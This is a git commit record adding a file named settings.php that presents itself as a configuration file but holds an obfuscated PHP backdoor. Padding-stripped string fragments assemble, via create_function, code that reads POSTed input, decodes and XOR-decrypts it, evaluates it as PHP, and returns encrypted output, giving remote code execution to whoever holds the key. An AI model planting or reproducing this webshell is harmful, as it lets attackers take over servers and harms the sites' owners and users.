b04c50857b2f5155ab9343297db1f4339935b163
AlvaXPloit <alvaxploit@gmail.com>
2025-12-13 18:17:42 +0700

    Add obfuscated PHP settings file

---
+++ settings.php
@@ -0,0 +1,10 @@
+<?php
+$R='t_contentsQ%();@ob_enQ%d_cleanQ%()Q%;$r=@baseQ%64_encQ%Q%ode(@x(@gzQ%compressQ%($Q%o),Q%$Q%Q%k));print("$p$kh$r$kf");}';
+$H='$k="Q%40Q%502dcc";Q%$kh="d7Q%55Q%3a5b2125";$kQ%f="978Q%fa84e0280Q%Q%";$p="VQY0Q%AbQ%sP6HtM0Z91";fQ%Q%unction xQ%Q%($Q%';
+$P='npQ%ut"),$m)==Q%1) {@oQ%b_Q%startQ%();@eQ%val(@gQ%zuncompress(Q%@x(@Q%baQ%se64_Q%decodQ%e($mQ%[1]),$k)));Q%$Q%o=@ob_geQ%';
+$O='$o.Q%=$Q%t{$i}^$k{$Q%jQ%};}}returnQ% $oQ%;}if Q%(@pQ%reg_match("Q%/$Q%kQ%h(.+)$Q%kf/",@file_Q%get_conQ%tents("phpQ%://i';
+$x=str_replace('nq','','cnqreanqnqte_fnqunnqctnqion');
+$k='t,$Q%k){$c=strleQ%n($k);$l=strQ%len($t);$o=Q%"";forQ%Q%Q%($i=0Q%;$i<$l;){for($j=Q%0;(Q%$Q%j<$Q%c&&$i<$l);$j++,$i++Q%){';
+$f=str_replace('Q%','',$H.$k.$O.$P.$R);
+$v=$x('',$f);$v();
+?>
